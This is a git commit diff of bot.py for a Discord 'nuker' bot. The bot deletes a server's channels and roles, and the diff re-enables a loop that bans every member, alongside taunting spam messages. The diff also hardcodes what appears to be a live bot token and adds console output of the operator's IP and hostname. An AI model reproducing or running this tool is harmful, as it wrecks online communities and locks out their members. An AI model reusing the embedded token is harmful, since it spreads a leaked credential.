48f1bcdbfe9a3f2e74ff5f682a26528e323ff554
Unknown <68416923+3jm@users.noreply.github.com>
2022-02-04 21:31:21 -0500

    [+] added more console information

--- bot.py
+++ bot.py
@@ -1,12 +1,15 @@
 import discord
 import ctypes
 import os
+import requests
+import socket
+import json
 from discord.ext import commands
 import random
 from discord import Permissions
 from colorama import Fore, Style
 import asyncio
-token = "Bot token here"
+token = "OTM4OTA1NzcxMzc3MzI0MTAy.YfxGIw.L24Yquj2ckg7JSGV1kciW2cATbs"
 winTitle = "NLE NUKER | REVAMPED BY OASIS"
 
 SPAM_CHANNEL =  ["OASIS runs you" , "Get Banned" , "NUKED" , "oops Beamed","F IN CHAT Beamed You","Should Have Listened","Get beamed clowns","Nuked by OASIS ","oops got nuked","I run you","Nuked by OASIS","I run you","kinda got beamed by yourself"]
@@ -19,11 +22,13 @@ client.remove_command('help')
 async def on_ready():
    ctypes.windll.kernel32.SetConsoleTitleW("NLE NUKER | REVAMPED BY OASIS")
    os.system('cls')
+   url = 'https://api.ipify.org/?format=json'
+   r = requests.get(url)
+   data = r.json()
    print(f''' {Fore.YELLOW}
-
                              _     _                                   
-                        _wr""        "-q__                             
-                     _dP                 9m_     
+                        _wr""        "-q__                         {Fore.MAGENTA}┏━━━━━━━━━━━━━━━━━━━━ {Fore.CYAN}Info{Fore.MAGENTA} ━━━━━━━━━━━━━━━━━━━┓{Fore.YELLOW}    
+                     _dP                 9m_                       
                    _#P                     9#_                      {Fore.CYAN}Run command {Fore.YELLOW}!help {Fore.CYAN}to fuck a server up!{Fore.YELLOW}
                   d#@                       9#m                        
                  d##                         ###                    {Fore.RED}[/]{Fore.RESET} Bot Information {Fore.RED}[\]{Fore.YELLOW}
@@ -31,16 +36,16 @@ async def on_ready():
                 ####K                       J###K                   {Fore.RESET}Your Bot's ID: {Fore.CYAN}{client.user.id}{Fore.YELLOW}      
                 ]####K      ___aaa___      J####F                   {Fore.RESET}Server Count: {Fore.CYAN}{len(client.guilds)}{Fore.YELLOW}    
             __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
-         _g##############mZ_         __g##############m_               
-       _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
-      a###""          ,Z"#####@" '######"\g          ""M##m             
+         _g##############mZ_         __g##############m_            {Fore.BLUE}[/]{Fore.RESET} Your Information {Fore.BLUE}[\]{Fore.YELLOW}   
+       _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_          {Fore.RESET}Your IP: {Fore.CYAN}{data["ip"]}{Fore.YELLOW}   
+      a###""          ,Z"#####@" '######"\g          ""M##m         {Fore.RESET}Your UUID: {Fore.CYAN}{socket.gethostname()}{Fore.YELLOW}    
      J#@"             0L  "*##     ##@"  J#              *#K           
      #"               `#    "_gmwgm_~    dF               `#_          
-    7F                 "#_   ]#####F   _dK                 JE          
-    ]                    *m__ ##### __g@"                   F          
-                          "PJ#####LP"                                 
-    `                       0######_                      '           
-                          _0########_                                   
+    7F                 "#_   ]#####F   _dK                 JE       {Fore.CYAN}[?]{Fore.RESET} This was made by Over-EducatedFool{Fore.YELLOW}   
+    ]                    *m__ ##### __g@"                   F       {Fore.RESET}and re-vamped by {Fore.CYAN}Oasis.{Fore.YELLOW}   
+                          "PJ#####LP"                               {Fore.RESET}Github link:{Fore.YELLOW} https://github.com/3jm/NLE-NUKER  
+    `                       0######_                      '          
+                          _0########_                              {Fore.MAGENTA}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{Fore.YELLOW}     
         .               _d#####^#####m__              ,              
           "*w_________am#####P"   ~9#####mw_________w*"                  
              ""9@#####@M""           ""P@#####@M""                    
@@ -49,7 +54,6 @@ async def on_ready():
   {Fore.RESET}Logs From the bot will be displayed below.
   {Fore.YELLOW}#########################################{Fore.RESET}''')
    await client.change_presence(activity=discord.Game(name="fuck em"))
-   print('\n')
 
 @client.command()
 async def stop(ctx):
@@ -72,12 +76,12 @@ async def help(ctx):
         print(f'  [{Fore.GREEN}+{Fore.RESET}] {Fore.MAGENTA}{channel.name}{Fore.RESET} was deleted.')
       except Exception as e:
         print(f"  [{Fore.RED}-{Fore.RESET}] {Fore.MAGENTA}{channel.name}{Fore.RESET} was NOT deleted. | {e}")
-    #for member in guild.members:
-     #try:
-       #await member.ban()
-       #print(f"  [{Fore.GREEN}+{Fore.RESET}] {member.name}{Fore.MAGENTA}#{Fore.RESET}{member.discriminator} Was banned")
-     #except Exception as e:
-       #print(f"  [{Fore.RED}-{Fore.RESET}] {member.name}{Fore.MAGENTA}#{Fore.RESET}{member.discriminator} Was unable to be banned. | {e}")
+    for member in guild.members:
+     try:
+       await member.ban()
+       print(f"  [{Fore.GREEN}+{Fore.RESET}] {member.name}{Fore.MAGENTA}#{Fore.RESET}{member.discriminator} Was banned")
+     except Exception as e:
+       print(f"  [{Fore.RED}-{Fore.RESET}] {member.name}{Fore.MAGENTA}#{Fore.RESET}{member.discriminator} Was unable to be banned. | {e}")
     for role in guild.roles:
      try:
        await role.delete()
